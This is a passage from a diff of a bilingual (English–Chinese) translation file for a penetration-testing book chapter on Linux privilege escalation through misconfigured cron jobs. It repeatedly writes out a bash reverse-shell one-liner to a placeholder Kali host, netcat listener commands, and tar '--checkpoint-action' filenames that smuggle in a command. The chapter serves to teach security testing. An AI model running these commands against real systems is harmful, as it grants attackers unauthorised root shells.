+  id: totrans-124
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 输出如下：
 - en: '![Figure 12.11 – The user home directory'
+  id: totrans-125
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '![图 12.11 – 用户主目录'
 - en: '](Images/B17389_12_011.jpg)'
+  id: totrans-126
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '](Images/B17389_12_011.jpg)'
 - en: Figure 12.11 – The user home directory
+  id: totrans-127
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 图 12.11 – 用户主目录
 - en: As illustrated in the preceding screenshot, we are unable to locate the **overwrite.sh**
     script in the **user** home directory. This could be because the **root** user
     has not created the script yet. In any event, we can create the script ourselves
     and get it to provide us with a reverse shell with root privileges as the cron
     job will execute the script as the root user.
+  id: totrans-128
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 如前述截图所示，我们无法在 **user** 主目录中找到 **overwrite.sh** 脚本。这可能是因为 **root** 用户尚未创建该脚本。无论如何，我们可以自行创建该脚本，并通过
+    cron 作业以 root 用户身份执行该脚本，从而为我们提供反向 shell。
 - en: 'We can create the **overwrite.sh** script and insert a Bash command that will
     provide us with a reverse shell. This can be done by running the following command
     in the **user** home directory:'
+  id: totrans-129
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 我们可以创建 **overwrite.sh** 脚本，并插入一个 Bash 命令，为我们提供反向 shell。可以通过在 **user** 主目录中运行以下命令来实现：
 - en: '**echo "bash -i >& /dev/tcp/<KALI-IP>/<PORT> 0>&1" > overwrite.sh**'
+  id: totrans-130
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: This command will add a **bash** command that will connect to our reverse listener
     on the Kali Linux VM. Ensure that you replace the fields in the command with the
     respective IP address and port number.
+  id: totrans-131
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: 'After running the preceding command, the **overwrite.sh** file should have
     been created, and it should contain the command outlined in the following screenshot:'
+  id: totrans-132
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: '![Figure 12.12 – Overwrite file'
+  id: totrans-133
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: '](Images/B17389_12_012.jpg)'
+  id: totrans-134
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: Figure 12.12 – Overwrite file
+  id: totrans-135
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: Once we have created this file, we need to set up a reverse listener with Netcat.
+  id: totrans-136
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: 'We can set up the reverse listener on the Kali VM by running the following
     command:'
+  id: totrans-137
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
 - en: '**nc -nvlp <PORT>**'
+  id: totrans-138
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: Ensure that you specify the port that you used in the **overwrite.sh** script.
     After setting up the listener, we will need to wait for a few minutes for the
     cron job to run.
+  id: totrans-139
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: 'Once the cron job has been invoked, the **overwrite.sh** script will be executed.
     We should get a reverse shell on our listener with root privileges, as highlighted
     in the following screenshot:'
+  id: totrans-140
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: '![Figure 12.13 – Reverse shell'
+  id: totrans-141
   prefs: []
   type: TYPE_NORMAL
 - en: '](Images/B17389_12_013.jpg)'
+  id: totrans-142
   prefs: []
   type: TYPE_NORMAL
 - en: Figure 12.13 – Reverse shell
+  id: totrans-143
   prefs: []
   type: TYPE_NORMAL
 - en: With that, we have successfully elevated our privileges by leveraging a misconfiguration
     in the crontab **$PATH** variable. This allowed us to execute a custom command
     that provided us with an elevated reverse shell on the target system.
+  id: totrans-144
   prefs: []
   type: TYPE_NORMAL
 - en: Escalation via cron wildcards
+  id: totrans-145
   prefs:
   - PREF_H1
   type: TYPE_NORMAL
@@ -629,61 +919,75 @@
     (*****) are used to perform more than one action at a time, and they can be used
     in a variety of different ways. In this section, we will explore how they can
     be exploited to execute malicious commands or scripts if misconfigured.
+  id: totrans-146
   prefs: []
   type: TYPE_NORMAL
 - en: Important Note
+  id: totrans-147
   prefs: []
   type: TYPE_NORMAL
 - en: Note that the success of this technique will depend on whether or not wildcards
     have been utilized in cron jobs.
+  id: totrans-148
   prefs: []
   type: TYPE_NORMAL
 - en: 'Follow these steps:'
+  id: totrans-149
   prefs: []
   type: TYPE_NORMAL
 - en: The first step in this process involves identifying cron jobs that run commands
     or scripts with wildcards. Analyzing the **crontab** file reveals an interesting
     cron job that is responsible for creating and compressing backup archives:![Figure
     12.14 – Backup cron job
+  id: totrans-150
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
 - en: '](Images/B17389_12_014.jpg)'
+  id: totrans-151
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: Figure 12.14 – Backup cron job
+  id: totrans-152
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: As highlighted in the preceding screenshot, the cron job runs the **compress.sh**
     script located under **/usr/local/bin** as the root user and runs every minute
     of every hour, every day, and every month.
+  id: totrans-153
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: 'We can display the content of the **compress.sh** script by running the following
     command:'
+  id: totrans-154
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
 - en: '**cat /usr/local/bin/compress.sh**'
+  id: totrans-155
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: 'The output is as follows:'
+  id: totrans-156
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: '![Figure 12.15 – Displaying the content of the compress.sh script'
+  id: totrans-157
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: '](Images/B17389_12_015.jpg)'
+  id: totrans-158
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: Figure 12.15 – Displaying the content of the compress.sh script
+  id: totrans-159
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
@@ -692,145 +996,207 @@
     been compressed with the **tar** utility. However, we can also identify a wildcard
     (*****) at the end of the **tar** command. The wildcard is used to specify all
     the files in the **user** account's home directory.
+  id: totrans-160
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 如前面截图所示，我们可以确认脚本是从**用户**帐户的主目录执行的，且文件已使用**tar**工具进行压缩。然而，我们还可以发现**tar**命令的末尾有一个通配符（*****）。这个通配符用于指定**用户**帐户主目录中的所有文件。
 - en: The **tar** utility has a checkpoint feature that is used to display progress
     messages after a specific set of files. It also allows users to define a specific
     action that is executed during the checkpoint. We can leverage this feature to
     execute a reverse shell payload that will provide us with an elevated session
     when executed.
+  id: totrans-161
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: '**tar**工具具有一个检查点功能，用于在特定文件集之后显示进度消息。它还允许用户定义在检查点期间执行的特定操作。我们可以利用此功能来执行一个反向
+    Shell 负载，在执行时为我们提供一个提升的会话。'
 - en: 'We can create the reverse shell script and insert a **bash** command that will
     provide us with a reverse shell. This can be done by running the following command
     in the **user** home directory:'
+  id: totrans-162
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 我们可以创建反向 Shell 脚本，并插入一个**bash**命令，它将为我们提供反向 Shell。可以通过在**用户**的主目录中运行以下命令来实现：
 - en: '**echo ''bash -i >& /dev/tcp/<KALI-IP>/<PORT> 0>&1'' > shell.sh**'
+  id: totrans-163
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '**echo ''bash -i >& /dev/tcp/<KALI-IP>/<PORT> 0>&1'' > shell.sh**'
 - en: This command will add a **bash** command that will connect to our reverse listener
     on the Kali Linux VM. Ensure that you replace the fields in the command with the
     respective IP address and port number.
+  id: totrans-164
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 该命令将添加一个**bash**命令，它将连接到我们在 Kali Linux 虚拟机上的反向监听器。确保在命令中替换相应的 IP 地址和端口号。
 - en: 'After running the preceding command, the **shell.sh** file should have been
     created, and it should contain the command outlined in the following screenshot:'
+  id: totrans-165
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 运行上述命令后，应该已经创建了**shell.sh**文件，并且文件中应包含以下截图所示的命令：
 - en: '![Figure 12.16 – Shell script'
+  id: totrans-166
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '![图 12.16 – Shell 脚本](Images/B17389_12_016.jpg)'
 - en: '](Images/B17389_12_016.jpg)'
+  id: totrans-167
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '](Images/B17389_12_016.jpg)'
 - en: Figure 12.16 – Shell script
+  id: totrans-168
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 图 12.16 – Shell 脚本
 - en: Now that we have created the file, we need to set up a reverse listener with
     Netcat.
+  id: totrans-169
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 现在我们已经创建了文件，需要使用 Netcat 设置反向监听器。
 - en: 'We can set up the reverse listener on the Kali VM by running the following
     command:'
+  id: totrans-170
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 我们可以通过运行以下命令在 Kali 虚拟机上设置反向监听器：
 - en: '**nc -nvlp <PORT>**'
+  id: totrans-171
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '**nc -nvlp <PORT>**'
 - en: Ensure that you specify the port that you used in the **shell.sh** script.
+  id: totrans-172
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 确保在**shell.sh**脚本中指定你使用的端口。
 - en: 'We can now set up our **tar** checkpoints in the **user** account''s home directory.
     This can be done by running the following command on the target system:'
+  id: totrans-173
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 现在我们可以在**用户**帐户的主目录中设置**tar**检查点。这可以通过在目标系统上运行以下命令来实现：
 - en: '**touch /home/user/--checkpoint=1**'
+  id: totrans-174
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '**touch /home/user/--checkpoint=1**'
 - en: 'After setting up our checkpoint, we need to set up our checkpoint action. In
     this case, our checkpoint action will execute the **shell.sh** script, which will
     provide us with an elevated reverse shell. This can be done by running the following
     command:'
+  id: totrans-175
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 设置好检查点后，我们需要设置检查点操作。在此案例中，我们的检查点操作将执行**shell.sh**脚本，它将为我们提供一个提升的反向 Shell。可以通过运行以下命令来实现：
 - en: '**touch /home/user/--checkpoint-action=exec=sh\ shell.sh**'
+  id: totrans-176
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '**touch /home/user/--checkpoint-action=exec=sh\ shell.sh**'
 - en: 'After setting up the **tar** checkpoint and checkpoint action, we need to wait
     a few minutes for the cron job to be invoked, after which we should receive an
     elevated reverse shell on our Netcat listener, as highlighted in the following
     screenshot:'
+  id: totrans-177
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 设置好**tar**检查点和检查点操作后，我们需要等待几分钟，直到 cron 作业被触发，此时我们应该会在 Netcat 监听器上收到一个提升的反向 Shell，如下图所示：
 - en: '![Figure 12.17 – Reverse shell'
+  id: totrans-178
   prefs: []
   type: TYPE_NORMAL
+  zh: '![图 12.17 – 反向 Shell](Images/B17389_12_017.jpg)'
 - en: '](Images/B17389_12_017.jpg)'
+  id: totrans-179
   prefs: []
   type: TYPE_NORMAL
+  zh: '](Images/B17389_12_017.jpg)'
 - en: Figure 12.17 – Reverse shell
+  id: totrans-180
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 12.17 – 反向 Shell
 - en: With that, we have successfully elevated our privileges by exploiting cron jobs
     that implement the improper use of wildcards to execute a reverse shell payload
     as the root user.
+  id: totrans-181
   prefs: []
   type: TYPE_NORMAL
+  zh: 通过利用 cron 作业中错误使用通配符来执行反向 Shell 负载作为 root 用户，我们成功地提升了特权。
 - en: Now, let's take a look at how to elevate our privileges through cron file overwrites.
+  id: totrans-182
   prefs: []
   type: TYPE_NORMAL
+  zh: 现在，让我们看看如何通过 cron 文件覆盖提升我们的特权。
 - en: Escalation via cron file overwrites
+  id: totrans-183
   prefs:
   - PREF_H1
   type: TYPE_NORMAL
+  zh: 通过 cron 文件覆盖进行特权提升
 - en: Another technique we can leverage to elevate our privileges is the ability to
     overwrite the content of scripts that are used by cron jobs. In the previous sections,
     we explored the process of leveraging misconfigured paths and utilizing wildcards.
     However, we did not explore the process of overwriting the content of scripts
     or files to elevate our privileges.
+  id: totrans-184
   prefs: []
   type: TYPE_NORMAL
+  zh: 另一项我们可以利用的技术是覆盖cron作业使用的脚本内容来提升权限。在前面的章节中，我们探讨了如何利用错误配置的路径和使用通配符。然而，我们没有探讨如何通过覆盖脚本或文件的内容来提升权限。
 - en: Note
+  id: totrans-185
   prefs: []
   type: TYPE_NORMAL
+  zh: 注
 - en: The success and viability of this technique will depend on whether we have the
     necessary permissions to write or make changes to the script or file being run
     by the cron job.
+  id: totrans-186
   prefs: []
   type: TYPE_NORMAL
+  zh: 这项技术的成功与可行性将取决于我们是否拥有修改或更改由cron作业执行的脚本或文件的必要权限。
 - en: 'This technique can be performed by following these steps:'
+  id: totrans-187
   prefs: []
   type: TYPE_NORMAL
+  zh: 这项技术可以通过以下步骤执行：
 - en: The first step in this process involves identifying a cron job that executes
     a script or binary with read and write permissions as the root user. In this case,
     we can identify a cron job that runs the **overwrite.sh** script when invoked,
     as highlighted in the following screenshot:![Figure 12.18 – Overwrite cron job](Images/B17389_12_018.jpg)
+  id: totrans-188
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 该过程的第一步是识别一个以root用户身份执行具有读写权限的脚本或二进制文件的cron作业。在这种情况下，我们可以识别一个运行**overwrite.sh**脚本的cron作业，如下图所示：![图
+    12.18 – 覆盖cron作业](Images/B17389_12_018.jpg)
 - en: Figure 12.18 – Overwrite cron job
+  id: totrans-189
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 图 12.18 – 覆盖cron作业
 - en: 'We looked at how to exploit this particular cron job in section two of this
     chapter, *Escalation via cron paths*, where we exploited a misconfigured path
     that allowed us to create a custom **overwrite.sh** script that provided us with
@@ -839,177 +1205,255 @@
     the cron job. However, if the **overwrite.sh** script is not found in the first
     directory, cron will check the other directories specified in the **$PATH** variable,
     as highlighted in the following screenshot:'
+  id: totrans-190
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 我们在本章第二节中讨论了如何利用这个特定的cron作业，*通过cron路径提升权限*，在该节中，我们利用了错误配置的路径，允许我们创建一个自定义的**overwrite.sh**脚本，执行时提供提升权限的反向shell。这是因为默认路径变量指定了**user**帐户的主目录作为cron作业的主目录。然而，如果在第一个目录中未找到**overwrite.sh**脚本，cron将检查**$PATH**变量中指定的其他目录，正如以下截图所示：
 - en: '![Figure 12.19 – Crontab paths'
+  id: totrans-191
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '![图 12.19 – Crontab路径'
 - en: '](Images/B17389_12_019.jpg)'
+  id: totrans-192
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '](Images/B17389_12_019.jpg)'
 - en: Figure 12.19 – Crontab paths
+  id: totrans-193
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 图 12.19 – Crontab路径
 - en: 'In this case, we do not find the **overwrite.sh** script in the **user** account''s
     home directory. As a result, we can search for the script in the other directories
     specified in the **$PATH** variable. This can be done by listing the contents
     of each directory, as follows:'
+  id: totrans-194
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 在这种情况下，我们未在**user**帐户的主目录中找到**overwrite.sh**脚本。因此，我们可以在**$PATH**变量中指定的其他目录中搜索该脚本。可以通过列出每个目录的内容来实现，如下所示：
 - en: '**ls -al /usr/local/bin | grep overwrite.sh**'
+  id: totrans-195
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '**ls -al /usr/local/bin | grep overwrite.sh**'
 - en: 'Alternatively, you can use the **locate** utility to search for the **overwrite.sh**
     script by running the following command:'
+  id: totrans-196
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 另外，你可以使用**locate**工具通过运行以下命令来搜索**overwrite.sh**脚本：
 - en: '**locate overwrite.sh**'
+  id: totrans-197
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '**locate overwrite.sh**'
 - en: 'In this case, we will find the file under the **/usr/local/bin** directory,
     as highlighted in the following screenshot:'
+  id: totrans-198
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 在这种情况下，我们将在**/usr/local/bin**目录下找到文件，正如以下截图所示：
 - en: '![Figure 12.20 – Locating the script'
+  id: totrans-199
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '![图 12.20 – 定位脚本'
 - en: '](Images/B17389_12_020.jpg)'
+  id: totrans-200
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '](Images/B17389_12_020.jpg)'
 - en: Figure 12.20 – Locating the script
+  id: totrans-201
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 图 12.20 – 定位脚本
 - en: 'The next step involves identifying the permissions of the **overwrite.sh**
     to determine whether we can make changes or overwrite the content of the script.
     This can be done by running the following command:'
+  id: totrans-202
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 下一步是识别**overwrite.sh**脚本的权限，以确定我们是否可以更改或覆盖脚本的内容。可以通过运行以下命令来实现：
 - en: '**ls -al /usr/local/bin | grep overwrite.sh**'
+  id: totrans-203
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '**ls -al /usr/local/bin | grep overwrite.sh**'
 - en: 'The output is shown in the following screenshot:'
+  id: totrans-204
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 输出如下所示，见下图：
 - en: '![Figure 12.21 – File permissions'
+  id: totrans-205
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '![图 12.21 – 文件权限'
 - en: '](Images/B17389_12_021.jpg)'
+  id: totrans-206
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '](Images/B17389_12_021.jpg)'
 - en: Figure 12.21 – File permissions
+  id: totrans-207
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 图 12.21 – 文件权限
 - en: In this case, we can determine that the script has read and write permissions.
     As a result, we can make changes or overwrite the file with our own commands.
+  id: totrans-208
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 在这种情况下，我们可以确定该脚本具有读写权限。因此，我们可以使用自己的命令对文件进行修改或覆盖。
 - en: 'Now, let''s add a **bash** command that will provide us with a reverse shell
     to the **overwrite.sh** script. This can be done by running the following command:'
+  id: totrans-209
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 现在，让我们在 **overwrite.sh** 脚本中添加一个 **bash** 命令，为我们提供一个反向 Shell。可以通过运行以下命令来实现：
 - en: '**echo "bash -i >& /dev/tcp/<KALI-IP>/<PORT> 0>&1" >> /usr/local/bin/overwrite.sh**'
+  id: totrans-210
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '**echo "bash -i >& /dev/tcp/<KALI-IP>/<PORT> 0>&1" >> /usr/local/bin/overwrite.sh**'
 - en: This command will append a **bash** command that will connect to our reverse
     listener on the Kali Linux VM. Ensure that you replace the fields in the command
     with the respective IP address and port number.
+  id: totrans-211
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 该命令将附加一个 **bash** 命令，它将连接到我们在Kali Linux虚拟机上的反向监听器。请确保用相应的IP地址和端口号替换命令中的字段。
 - en: 'After running the preceding command, the **overwrite.sh** script should contain
     the command outlined in the following screenshot:'
+  id: totrans-212
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 运行上述命令后，**overwrite.sh** 脚本应包含以下截图中所示的命令：
 - en: '![Figure 12.22 – The overwrite.sh script''s appended command'
+  id: totrans-213
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '![图 12.22 – overwrite.sh 脚本附加的命令'
 - en: '](Images/B17389_12_022.jpg)'
+  id: totrans-214
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '](Images/B17389_12_022.jpg)'
 - en: Figure 12.22 – The overwrite.sh script's appended command
+  id: totrans-215
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 图 12.22 – overwrite.sh 脚本附加的命令
 - en: Once we have appended the **bash** command, we will need to set up a reverse
     listener with Netcat.
+  id: totrans-216
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 一旦我们附加了 **bash** 命令，我们需要使用Netcat设置一个反向监听器。
 - en: 'We can set up the reverse listener on the Kali VM by running the following
     command:'
+  id: totrans-217
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 我们可以通过运行以下命令在Kali虚拟机上设置反向监听器：
 - en: '**nc -nvlp <PORT>**'
+  id: totrans-218
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '**nc -nvlp <PORT>**'
 - en: Ensure that you specify the port that you used in the **overwrite.sh** script.
+  id: totrans-219
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 请确保指定您在 **overwrite.sh** 脚本中使用的端口。
 - en: 'After appending the **bash** command to the **overwrite.sh** script, we will
     need to wait for a few minutes for the cron job to be invoked, after which we
     should receive an elevated reverse shell on our Netcat listener, as highlighted
     in the following screenshot:'
+  id: totrans-220
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 在将 **bash** 命令附加到 **overwrite.sh** 脚本后，我们需要等待几分钟，以便cron作业被触发，之后我们应该会在Netcat监听器上收到一个提权的反向Shell，如下图所示：
 - en: '![Figure 12.23 – Reverse shell'
+  id: totrans-221
   prefs: []
   type: TYPE_NORMAL
+  zh: '![图 12.23 – 反向 Shell'
 - en: '](Images/B17389_12_023.jpg)'
+  id: totrans-222
   prefs: []
   type: TYPE_NORMAL
+  zh: '](Images/B17389_12_023.jpg)'
 - en: Figure 12.23 – Reverse shell
+  id: totrans-223
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 12.23 – 反向 Shell
 - en: With that, we have successfully elevated our privileges by exploiting cron jobs
     that run scripts with misconfigured permissions to execute a reverse shell payload
     as the root user.
+  id: totrans-224
   prefs: []
   type: TYPE_NORMAL
+  zh: 通过这一操作，我们成功利用了配置错误的cron作业，提升了权限，并以root用户身份执行了反向Shell有效负载。
 - en: You should now have a firm grasp of how to enumerate the cron jobs running on
     a system, as well as how to exploit them through various techniques to elevate
     your privileges.
+  id: totrans-225
   prefs: []
   type: TYPE_NORMAL
+  zh: 现在，您应该对如何枚举系统上运行的cron作业有了清晰的了解，并且掌握了如何通过多种技术手段利用这些作业提升权限。
 - en: Summary
+  id: totrans-226
   prefs:
   - PREF_H1
   type: TYPE_NORMAL
+  zh: 总结
 - en: In this chapter, we started by looking at how the cron utility works and the
     structure of the crontab file. We then took an in-depth look at how to exploit
     misconfigured cron paths. We also explored the process of exploiting wildcards
     in scripts executed by cron jobs to elevate our privileges. Finally, we ended
     this chapter by looking at how to elevate our privileges through cron file overwrites.
+  id: totrans-227
   prefs: []
   type: TYPE_NORMAL
+  zh: 在本章中，我们首先研究了cron工具的工作原理和crontab文件的结构。然后，我们深入探讨了如何利用配置错误的cron路径。我们还探索了通过利用cron作业执行的脚本中的通配符来提升权限的过程。最后，我们通过研究如何通过cron文件覆盖提升权限结束了本章内容。
 - en: In the next chapter, we will look at how to exploit SUDO and SUID binaries to
     elevate our privileges.
+  id: totrans-228
   prefs: []
   type: TYPE_NORMAL
+  zh: 在下一章，我们将探讨如何利用SUDO和SUID二进制文件来提升我们的权限。
